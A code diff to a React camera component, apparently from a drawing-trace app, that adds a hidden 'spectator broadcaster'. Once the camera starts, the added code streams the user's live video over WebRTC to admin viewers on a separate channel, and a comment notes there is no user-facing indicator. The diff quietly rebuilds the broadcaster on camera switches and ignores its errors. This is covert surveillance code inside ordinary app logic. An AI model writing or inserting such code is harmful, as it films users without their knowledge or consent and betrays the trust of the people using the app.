@@ -6,6 +6,7 @@ import { startSession, addSessionDuration } from '../lib/traceStats.js';
 import { loadPendingImage } from '../lib/pendingImage.js';
 import { consumeFreeSession, trialAlreadyConsumedThisVisit } from '../lib/freeTrial.js';
 import { setPresence, clearPresence } from '../lib/presence.js';
+import { startBroadcaster } from '../lib/livePreview.js';
 import {
   cssMatrix3d,
   identityCorners,
@@ -108,6 +109,13 @@ export default function Trace() {
   // Start (or restart) the camera whenever facingMode changes.
   useEffect(() => {
     let cancelled = false;
+    // Operator-side spectator broadcaster. Reuses the existing WebRTC
+    // signaling on a separate `kind: 'tracewatch'` channel so it never
+    // collides with the user's own /live device-pairing. Sits in 'waiting'
+    // (zero peer-connection cost — just a presence-tracking realtime
+    // channel) until an admin viewer joins. No user-facing indicator.
+    let broadcaster = null;
+    const userId = user?.id;
 
     async function startCamera() {
       // Tear down any existing stream first
@@ -143,6 +151,23 @@ export default function Trace() {
           if (caps?.torch) setTorchSupported(true);
         }
         setCameraError('');
+
+        // Spin up the spectator broadcaster once we actually have a stream.
+        // Tear down any prior broadcaster first (camera switch flips this
+        // effect; the old WebRTC peer is bound to the previous stream).
+        if (broadcaster) { try { broadcaster.stop(); } catch { /* ignore */ } broadcaster = null; }
+        if (userId && !cancelled) {
+          try {
+            broadcaster = startBroadcaster({
+              userId,
+              kind: 'tracewatch',
+              stream,
+              onError: (err) => console.warn('[trace] watch broadcaster error:', err),
+            });
+          } catch (err) {
+            console.warn('[trace] could not start watch broadcaster:', err);
+          }
+        }
       } catch (err) {
         setCameraError(
           err?.name === 'NotAllowedError'
@@ -155,11 +180,12 @@ export default function Trace() {
     startCamera();
     return () => {
       cancelled = true;
+      if (broadcaster) { try { broadcaster.stop(); } catch { /* ignore */ } broadcaster = null; }
       const stream = streamRef.current;
       if (stream) stream.getTracks().forEach((t) => t.stop());
       streamRef.current = null;
     };
-  }, [facingMode]);
+  }, [facingMode, user?.id]);
 
   // Auto-hide the gesture hint after a moment
   useEffect(() => {
